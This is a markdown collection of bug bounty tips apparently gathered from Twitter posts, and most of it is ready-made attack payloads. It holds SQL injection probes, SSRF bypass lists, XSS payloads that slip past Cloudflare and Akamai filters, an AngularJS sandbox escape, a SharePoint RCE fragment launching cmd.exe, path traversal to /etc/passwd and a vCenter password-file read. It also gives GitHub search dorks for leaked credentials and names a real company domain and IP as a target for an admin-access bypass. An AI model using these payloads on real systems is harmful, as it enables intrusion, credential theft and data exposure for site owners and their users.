# Bug Bounty Tips - January 2021

## This is how to find sql-Injection 100% of the time
```sql
/?q=1
/?q=1'
/?q=1"
/?q=[1]
/?q[]=1
/?q=1`
/?q=1\
/?q=1/*'*/
/?q=1/*!1111'*/
/?q=1'||'asd'||'   <== concat string
/?q=1' or '1'='1
/?q=1 or 1=1
/?q='or''='
```

## Burpsuite Auto Repeater match regex
```text
https?:\/\/(www\.)?[-a-zA-Z0–9@:%._\+~#=]{1,256}\.[a-zA-Z0–9()]{1,6}\b([-a-zA-Z0–9()@:%_\+.~#?&//=]*)
```
replace with your domain or burp Collaborator link in `request header` or `request param value`

## SQL Server Hacking with LAB
***https://blog.netspi.com/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/***

***https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation/***

***https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/***

***https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/***

## SSRF Bypass Payload
```text
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://0.0.0.0:80
http://0.0.0.0:443
http://0.0.0.0:22
Bypass using HTTPS
https://127.0.0.1/
https://localhost/
Bypass localhost with [::]
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:22/ SSH
http://127.1/
http://0000::1:80/
http://[::]:80/
http://2130706433/
http://whitelisted@127.0.0.1
http://0x7f000001/
http://017700000001
http://0177.00.00.01
http://⑯⑨。②⑤④。⑯⑨｡②⑤④/
http://⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ｡⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ:80/
http://⓪ⓧⓐ⑨ⓕⓔⓐ⑨ⓕⓔ:80/
http://②⑧⑤②⓪③⑨①⑥⑥:80/
http://④②⑤｡⑤①⓪｡④②⑤｡⑤①⓪:80/ 
http://⓪②⑤①。⓪③⑦⑥。⓪②⑤①。⓪③⑦⑥:80/
http://0xd8.0x3a.0xd6.0xe3
http://0xd83ad6e3
http://0xd8.0x3ad6e3
http://0xd8.0x3a.0xd6e3
http://0330.072.0326.0343
http://000330.0000072.0000326.00000343
http://033016553343
http://3627734755
http://%32%31%36%2e%35%38%2e%32%31%34%2e%32%32%37
http://216.0x3a.00000000326.0xe3
http://localtest.me
http://newyork.localtest.me
http://mysite.localtest.me
http://redirecttest.localtest.me
http://sub1.sub2.sub3.localtest.me
http://bugbounty.dod.network
http://spoofed.burpcollaborator.net
```

## Bug Bounty Tips 
1. https://site.com/admin/sign_up  ---- 403 Forbidden
2. http://site.com resolves to IP: 1.2.3.4
3. https://1.2.3.4/admin/sign_up  ----  200 OK
4. Signed up there with having all the admin privileges.
Since Oppo is now a public program on **HackerOne**, please check out the following domain.
-> https://pre-partner.realme.com -- 403 Forbidden
-> It resolves to IP: 13.127.121.140
-> https://13.127.121.140  --- 200 OK
***Really a good tip kudos to [umsvisha](https://twitter.com/umsvishal)***

## CVE-2020-0646 SharePoint RCE

PoC
```text
CallExternalMethodActivity x:Name="foo" 
....System.Diagnostics.Process.Start("cmd.exe",
```
![img](https://pbs.twimg.com/media/Eq8wSJkVgAAvRJq?format=png&name=medium)
**Google Dork**
```text
.sharepoint.com/_vti_bin/webpartpages/asmx -docs -msdn -mdsec
```
***https://www.mdsec.co.uk/2020/01/code-injection-in-workflows-leading-to-sharepoint-rce-cve-2020-0646/?fbclid=IwAR0b4QZxdQKVYN-ES62rdt9yN5MMzfgpK7DkdkbIq44Flm-ODiuqzeIglUQ***

## Redirect bypass
```text
/?ref_url=https://abc.com\attack.com/../../../
```
***https://twitter.com/jae_hak99/status/1345210080422072321?s=20***

## 🚨 New CloudFlare XSS Bypass! 🚨
```text
<svg onload=alert%26%230000000040"1")>
```

## 💉 SQLINJECTION ONELINE 💉
```sh
findomain -t https://t.co/SCNfLzBcWO -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 1
```
***https://github.com/KingOfBugbounty/KingOfBugBountyTips***

## Github Dorks Search Keywords
```text
Jenkins
OTP
oauth
authoriztion
password
pwd
ftp
dotfiles
JDBC
key-keys
send_key-keys
send,key-keys
token
user
login-singin
passkey-passkeys
pass
secret
SecretAccessKey
app_AWS_SECRET_ACCESS_KEY AWS_SECRET_ACCESS_KEY
credentials
config
security_credentials
connectionstring
ssh2_auth_password
DB_PASSWORD
password
passwd
pwd
secret
private
Ldap
secret_key
secretkey
secret api
secret token
secret pass
secret password
aws secret
client secret
```

### Bash Keyword
```text
language:bash password
language:bash pwd
language:bash ftp
language:bash dotfiles
language:bash JDBC
language:bash key-keys
language:bash send_key-keys
language:bash send,key-keys
language:bash token
language:bash user
language:bash login-singin
language:bash passkey-passkeys
language:bash pass
language:bash secret
language:bash credentials
language:bash config
language:bash security_credentials
language:bash connectionstring
language:bash ssh2_auth_password
```

### Python keywords
```text
language:python password
language:python pwd
language:python ftp
language:python dotfiles
language:python JDBC
language:python key-keys
language:python send_key-keys
language:python send,key-keys
language:python token
language:python user
language:python login-singin
language:python passkey-passkeys
language:python pass
language:python secret
language:python credentials
language:python config
language:python security_credentials
language:python connectionstring
language:python ssh2_auth_password
```
***Example :***`“bugcrowd.com” password language:bash`

**Source:-** 

***https://orwaatyat.medium.com/your-full-map-to-github-recon-and-leaks-exposure-860c37ca2c82***

## Apache Flink new CVE Dir Traversal
```text
/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
```

## Subdomain Takeover POC by [0xpatrik](https://twitter.com/0xpatrik)
- ***https://0xpatrik.com/takeover-proofs/***

## Unauthenticated Arbitrary File Read vulnerability in VMware vCenter before version 6.5u1

PoC for extracting passwords from http://vcdb.properties file - /eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\http://vcdb.properties

**Source:** https://twitter.com/payloadartist/status/1345760740465000448?s=20

## Subdomain Enumeration
```sh
curl -s "https://jldc.me/anubis/subdomains/att.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | anew
```
 ***Note: for enumerating more target change att.com to your target domain***

## SSRF Bypass
```text
http://google.com:80\\@yahoo.com/
```
which will send request to `yahoo` instead of `google`

## Cloudflare xss bypass payloads by @spyerror
```js
<img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert`1`;>
<svg%0Aonauxclick=0;[1].some(confirm)//
```

## SSRF on image Renderer
***https://hackerone.com/reports/811136***

## Cloudflare XSS Bypass via add 8 or more superfluous leading zeros for dec and 7 or more for hex.
```js
Dec: <svg onload=prompt%26%230000000040document.domain)>
Hex: <svg onload=prompt%26%23x000000028;document.domain)>
```

## Hunt for Low Hanging Fruits 
If you're hunting for low-hanging bugs in source code, grep and regex can help you to identify hotspots. For example, you might find basic rXSS in PHP with something like this:
```sh
grep -r "echo.*\$_\(GET\|REQUEST\|POST\)" 
```

## site-wide, target specific Akamai XSS Bypass 
The word "javascript" is removed in all reflection contexts, which can be abused to craft Akamai bypasses:
```js
<ijavascriptmg+src+ojavascriptnerror=confirm(1)>
````
⬇️
```js
<img src onerror=confirm(1)>
```

## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_)
- [Learn365](https://github.com/harsh-bothra/learn365)
- [Session Puzzling Attack](https://twitter.com/harshbothra_/status/1350741817243918336?s=20)
- [Web Cache Deception Attack](https://twitter.com/harshbothra_/status/1350374481231970305?s=20)
- [Websocket Vuls Part -1](https://twitter.com/harshbothra_/status/1349363147023372290?s=20)
- [Websocket Vuls Part -2](https://twitter.com/harshbothra_/status/1349769962043236357?s=20)
- [Websocket Vuls Part -3](https://twitter.com/harshbothra_/status/1350109203671597056?s=20)

## Apple IDOR Vulnerability
- [Apple IDOR via `X-Dsid`](https://twitter.com/samwcyo/status/1350025967331389442?s=20)

## Tiny sandbox escape for AngularJS 1.2.24 - 1.2.29
Need a tiny sandbox escape for AngularJS 1.2.24 - 1.2.29? I think this is the shortest possible. 19 characters.
```js
{{[]."-alert`1`-"}}
````
**Example**
```text
https://portswigger-labs.net/xss/angularjs.php?type=reflected&csp=0&version=1.2.26&x={{[].%22-alert`1`-%22}}
```
[![img](https://pbs.twimg.com/media/Eryi6dEXEAEykzE?format=png&name=small)](https://twitter.com/PortSwiggerRes/status/1350134023016902657?s=20)

## Infosec Matter Bug Biunty Tips
- https://www.infosecmatter.com/bug-bounty-tips-1/
- https://www.infosecmatter.com/bug-bounty-tips-2-jun-30/
- https://www.infosecmatter.com/bug-bounty-tips-3-jul-21/
- https://www.infosecmatter.com/bug-bounty-tips-4-aug-03/
- https://www.infosecmatter.com/bug-bounty-tips-5-aug-17/
- https://www.infosecmatter.com/bug-bounty-tips-6-sep-07/
- https://www.infosecmatter.com/bug-bounty-tips-7-sep-27/
- https://www.infosecmatter.com/bug-bounty-tips-8-oct-14/
- https://www.infosecmatter.com/bug-bounty-tips-9-nov-16/
- https://www.infosecmatter.com/bug-bounty-tips-10-dec-24/


